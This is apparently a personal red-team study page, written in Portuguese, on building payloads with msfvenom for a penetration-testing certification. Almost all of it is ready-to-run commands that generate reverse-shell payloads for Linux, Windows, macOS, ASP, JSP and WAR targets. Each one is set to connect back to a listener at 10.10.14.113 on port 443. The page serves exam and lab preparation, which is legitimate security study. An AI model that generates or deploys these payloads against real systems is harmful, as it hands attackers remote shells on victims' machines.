> For the complete documentation index, see [llms.txt](https://savitar.gitbook.io/mynotes/llms.txt). Markdown versions of documentation pages are available by appending `.md` to page URLs; this page is available as [Markdown](https://savitar.gitbook.io/mynotes/certifications-and-notes/red-team/cpts/shells-and-payloads/crafting-payloads-with-msfvenom.md).

# Crafting Payloads with MSFvenom

* **Listar Payloads**

```sh
msfvenom -l payloads
```

* `MSFvenom`comando usado para gerar um shell reverso baseado em Linux`stageless payload`

```sh
msfvenom -p linux/x64/shell_reverse_tcp LHOST=10.10.14.113 LPORT=443 -f elf > nameoffile.elf	
```

* Comando MSFvenom usado para gerar uma carga útil sem estágios de shell reverso baseada no Windows

```sh
msfvenom -p windows/shell_reverse_tcp LHOST=10.10.14.113 LPORT=443 -f exe > nameoffile.exe
```

* Comando MSFvenom usado para gerar uma carga útil de shell reverso baseada em MacOS

```sh
msfvenom -p osx/x86/shell_reverse_tcp LHOST=10.10.14.113 LPORT=443 -f macho > nameoffile.macho	
```

* Comando MSFvenom usado para gerar uma carga útil de shell reverso da web ASP

```sh
msfvenom -p windows/meterpreter/reverse_tcp LHOST=10.10.14.113 LPORT=443 -f asp > nameoffile.asp	
```

* Comando MSFvenom usado para gerar uma carga útil de shell reverso da web JSP

```sh
msfvenom -p java/jsp_shell_reverse_tcp LHOST=10.10.14.113 LPORT=443 -f raw > nameoffile.jsp	
```

* Comando MSFvenom usado para gerar um payload de shell reverso da web compatível com java/jsp WAR

```sh
msfvenom -p java/jsp_shell_reverse_tcp LHOST=10.10.14.113 LPORT=443 -f war > nameoffile.war	
```
